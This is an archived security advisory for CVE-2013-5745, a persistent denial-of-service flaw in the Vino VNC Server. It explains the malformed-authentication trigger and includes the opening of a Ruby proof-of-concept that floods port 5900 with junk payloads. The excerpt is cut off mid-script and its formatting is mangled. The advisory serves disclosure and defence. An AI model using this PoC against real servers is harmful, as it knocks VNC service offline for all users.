{
    "text": "vul_name : Vino VNC Server 3.7.3 Denial Of Service ， vul_cve : CVE-2013-5745 ， vul_poc : Trustwave SpiderLabs Security Advisory TWSL2013-028 :  ， Persistent Denial of Service Vulnerability in Vino VNC Server ， Published : 09/16/13 ， Version : 1.0 ， Vendor : The GNOME Project (  ， Product : Vino VNC Server ， Version affected : Vino VNC Server 3.7.3 and earlier versions ( 3.8 stable ， release is affected if encryption is disabled ) . ， Product description :  ， Vino is the GNOME desktop sharing server. ， Finding 1 : Remote Persistent Denial of Service Vulnerability ， Credit : Jonathan Claudius of Trustwave SpiderLabs ， CVE : CVE-2013-5745 ， CWE : CWE-20 ， The Vino VNC server , which is also the default VNC server in Ubuntu ，  ( 3.4.2-0ubuntu1.2 )  , is vulnerable to a persistent denial of service ， vulnerability. The vulnerability is triggered when a VNC client , who ， claims to only support protocol version 3.3 , sends malformed data during ， the authentication selection stage of the authentication process. ， If this process is repeated more than just a couple times , it causes Vino ， VNC server to fall into what appears to be an infinite loop , as seen in the ， service logs via repeating \"Authentication deferred - ignoring client ， message\" messages. This not only affects the connecting client IP , but ， affects service level availability for all potential VNC clients and the ， service fails to handle any new VNC client requests regardless of client ， IP. ， The Vino VNC server must be restarted in order to restore VNC service ， availability. ， Additionally , after the failure condition has occurred , the log file ，  (  ~ /.xsession-errors ) grows quickly to 1GB within 4min in testing. If left ， unattended in the failure state , a system wide denial of service due to ， file system consumption is possible. ， Example :  ， The following Proof of Concept ( PoC ) connects to the Vino VNC Server , sends ， a client banner , and then sends a malformed payload of repeating A's. ， After the first 3-4 payloads are sent , the port will remain open , but the ， service will fail to handle any new client requests from any client on any ， IP. ， vino-vnc-dos-poc.rb ， require 'socket' ， require 'timeout' ，  # Just a couple payloads in a row should be enough to send Vino into an ，  #  ( authentication deferred - ignoring client message loop ) and spoil the party ， client_banners = [  ]  ， 10.times {client_banners \"RFB 003.003\"} ， client_banners.each do | client_banner |  ， puts \"Testing \" + client_banner ， begin ， Timeout : timeout ( 5 ) { ， sock = TCPSocket.open ( \"a.b.c.d\" , 5900 )  ， puts \"Waiting for Server Banner.\" ， banner = sock.gets (  )  ， puts \"Got Server Banner : \" + banner ， sock.write ( client_banner + \"\\n\" )  ， payload = \"A\" * 16",
    "time": "2013.09.18"
}